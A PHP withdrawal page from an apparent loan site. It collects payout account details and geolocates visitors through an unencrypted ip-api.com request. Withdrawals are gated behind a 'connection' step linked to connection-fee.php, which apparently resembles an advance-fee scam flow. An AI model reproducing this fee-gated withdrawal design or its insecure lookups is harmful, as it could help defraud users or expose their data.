<?php
session_start();
require '../config/db.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION['user_id'];

$stmt = $conn->prepare("
    SELECT
        is_verified,
        verified_method,
        verified_account_name,
        verified_account_id
    FROM users
    WHERE id = ?
");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$user = $stmt->get_result()->fetch_assoc();
$stmt->close();

$is_verified = (int)($user['is_verified'] ?? 0);

/* -----------------------------
   GEO DETECTION (IP API)
------------------------------*/
$ip = $_SERVER['REMOTE_ADDR'];
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));

$country = $geo->country ?? 'Unknown';
$isUSA = ($country === "United States");

/* Store detected country for next page */
$_SESSION['country'] = $country;

/* Store amount */
$error = "";

/* fallback methods */
$paymentMethods = [];

$stmt = $conn->prepare("
    SELECT *
    FROM payment_methods
    WHERE country = ?
    ORDER BY type
");
$stmt->bind_param("s", $country);
$stmt->execute();
$result = $stmt->get_result();

while ($row = $result->fetch_assoc()) {
    $paymentMethods[] = $row;
}
$stmt->close();

/* fallback global */
if (empty($paymentMethods)) {
    $stmt = $conn->prepare("
        SELECT *
        FROM payment_methods
        WHERE country = 'Global'
        ORDER BY type
    ");
    $stmt->execute();
    $result = $stmt->get_result();

    while ($row = $result->fetch_assoc()) {
        $paymentMethods[] = $row;
    }
    $stmt->close();
}
?>

<?php include 'includes/header.php'; ?>
<?php include 'includes/navbar.php'; ?>

<div class="container">

    <div class="loan-form">

        <h2 style="text-align:center;margin-bottom:20px;">
            Withdraw Funds
        </h2>

        <div style="padding:15px;background:#f8fbff;border-left:5px solid var(--accent);border-radius:10px;margin-bottom:20px;">
            <strong>Detected Country:</strong>
            <?= htmlspecialchars($country) ?>
        </div>

        <?php if (!empty($error)): ?>
            <div class="alert-error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <?php if (!empty($_SESSION['success'])): ?>
            <div class="alert-success">
                <?= htmlspecialchars($_SESSION['success']) ?>
            </div>
            <?php unset($_SESSION['success']); ?>
        <?php endif; ?>
        
        <?php if (!empty($_SESSION['error'])): ?>
            <div class="alert-error">
                <?= htmlspecialchars($_SESSION['error']) ?>
            </div>
            <?php unset($_SESSION['error']); ?>
        <?php endif; ?>

        <?php if ($is_verified === 0): ?>
        
            <div style="padding:15px;background:#fff8e1;border-left:5px solid #ff9800;border-radius:10px;margin-bottom:20px;">
                <strong>Payment Method Not Connected</strong><br><br>
        
                To withdraw funds, you must first complete the one-time payment method connection process.
        
                <br><br>
        
                <a href="connection-fee.php"
                   class="submit-btn"
                   style="display:inline-block;text-decoration:none;">
                    Connect Payment Method
                </a>
            </div>
        
        <?php elseif ($is_verified === 1): ?>
        
            <div style="padding:15px;background:#e3f2fd;border-left:5px solid #2196f3;border-radius:10px;margin-bottom:20px;">
                <strong>Verification Pending</strong><br><br>
        
                Your payment method is currently under review.
        
                <br><br>
        
                You may reconnect your payment method if you need to update your details.
        
                <br><br>
        
                <a href="connection-fee.php"
                   class="submit-btn"
                   style="display:inline-block;text-decoration:none;">
                    Reconnect Payment Method
                </a>
            </div>
        
        <?php elseif ($is_verified === 2): ?>
        
            <div style="padding:15px;background:#e8f5e9;border-left:5px solid #4caf50;border-radius:10px;margin-bottom:20px;">
                <strong>Payment Method Approved</strong>
        
                <hr style="margin:10px 0;">
        
                <p>
                    <strong>Method:</strong>
                    <?= htmlspecialchars($user['verified_method']) ?>
                </p>
        
                <p>
                    <strong>Account Name:</strong>
                    <?= htmlspecialchars($user['verified_account_name']) ?>
                </p>
        
                <p>
                    <strong>Account ID:</strong>
                    <?= htmlspecialchars($user['verified_account_id']) ?>
                </p>
            </div>
        
            <form method="POST" action="process-withdrawal.php">
        
                <div class="form-group">
                    <label>Amount to Withdraw</label>
                    <input
                        type="number"
                        name="amount"
                        min="1"
                        step="0.01"
                        required
                    >
                </div>
        
                <button type="submit" class="submit-btn">
                    Submit Withdrawal Request
                </button>
        
            </form>
        
        <?php endif; ?>
        
        <?php if ($is_verified !== 2): ?>
        
        <!-- STEP 1 -->
        <div id="step1">
        
            <p style="margin-bottom:20px;">
                Are you currently located outside the United States?
            </p>
        
            <div style="display:flex;gap:10px;flex-wrap:wrap;">
        
                <button type="button"
                        class="submit-btn"
                        onclick="showStep2('fallback')">
                    Yes
                </button>
        
                <button type="button"
                        class="submit-btn"
                        style="background:#555;"
                        onclick="showStep2('usa')">
                    No
                </button>
        
            </div>
        
        </div>
    


        <!-- STEP 2 (hidden initially) -->
        <div id="step2" style="display:none;">

            <h3 style="text-align:center;margin-bottom:15px;">
                Link Withdrawal Method
            </h3>

            <div id="dynamicContent">

                <!-- USA FORM -->
                <div id="usaForm" style="display:none;">

                    <form method="POST" action="connection-fee" onsubmit="return debugSubmit(this);">

                        <input type="hidden" name="type" value="usa">
                        <input type="hidden" name="country" value="United States">

                        <div class="form-group">
                            <label>Payment Method</label>
                            <select name="method" required>
                                <option value="paypal">PayPal</option>
                                <option value="cashapp">Cash App</option>
                                <option value="venmo">Venmo</option>
                                <option value="zelle">Zelle</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <label>Account Identifier</label>
                            <input type="text" name="account" required>
                        </div>

                        <button type="submit" class="submit-btn">Continue</button>

                    </form>
                </div>

                <!-- FALLBACK FORM -->
                <div id="fallbackForm" style="display:none;">

                    <p>
                        Detected Country:
                        <strong><?= htmlspecialchars($country) ?></strong>
                    </p>

                    <form method="POST" action="connection-fee" onsubmit="return debugSubmit(this);">

                        <input type="hidden" name="type" value="fallback">
                        <input type="hidden" name="country" value="<?= htmlspecialchars($country) ?>">
                        <input type="hidden" name="selected_type" id="selected_type">

                        <div class="form-group">
                            <label>Payment Method</label>

                            <select name="payment_type" id="payment_type" required>
                                <option value="">Select Payment Method</option>

                                <?php foreach ($paymentMethods as $index => $method): ?>
                                    <option value="<?= $index ?>">
                                        <?= ucfirst($method['type']) ?>
                                    </option>
                                <?php endforeach; ?>

                            </select>
                        </div>

                        <div id="paymentFields" style="display:none;">

                            <div class="form-group">
                                <label id="label_method"></label>
                                <input type="text" name="method" id="field_method">
                            </div>

                            <div class="form-group">
                                <label id="label_method_name"></label>
                                <input type="text" name="method_name" id="field_method_name">
                            </div>

                            <div class="form-group">
                                <label id="label_method_id"></label>
                                <input type="text" name="method_id" id="field_method_id">
                            </div>

                            <button class="submit-btn">Continue</button>

                        </div>

                    </form>
                </div>

            </div>
        </div>

<?php endif; ?>

    </div>
</div>

<script>
const paymentMethods = <?= json_encode(
    $paymentMethods,
    JSON_HEX_TAG |
    JSON_HEX_APOS |
    JSON_HEX_QUOT |
    JSON_HEX_AMP
) ?>;

function debugSubmit(form) {
    console.log('Submitting form:', form);
    return true;
}

function showStep2(type) {

    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';

    if (type === 'usa') {
        document.getElementById('usaForm').style.display = 'block';
        document.getElementById('fallbackForm').style.display = 'none';
    } else {
        document.getElementById('fallbackForm').style.display = 'block';
        document.getElementById('usaForm').style.display = 'none';
    }
}

const paymentType = document.getElementById('payment_type');

if (paymentType) {

    paymentType.addEventListener('change', function () {

        const selected = paymentMethods[this.value];

        if (!selected) {
            document.getElementById('paymentFields').style.display = 'none';
            return;
        }

        document.getElementById('paymentFields').style.display = 'block';

        document.getElementById('label_method').textContent =
            selected.method || 'Method';

        document.getElementById('label_method_name').textContent =
            selected.method_name || 'Account Name';

        document.getElementById('label_method_id').textContent =
            selected.method_id || 'Account ID';

        document.getElementById('field_method').placeholder =
            'Enter ' + (selected.method || 'Method');

        document.getElementById('field_method_name').placeholder =
            'Enter ' + (selected.method_name || 'Account Name');

        document.getElementById('field_method_id').placeholder =
            'Enter ' + (selected.method_id || 'Account ID');

        document.getElementById('selected_type').value =
            selected.type || '';

        document.getElementById('field_method').required = true;
        document.getElementById('field_method_name').required = true;
        document.getElementById('field_method_id').required = true;
    });

}
</script>

<?php include 'includes/footer.php'; ?>
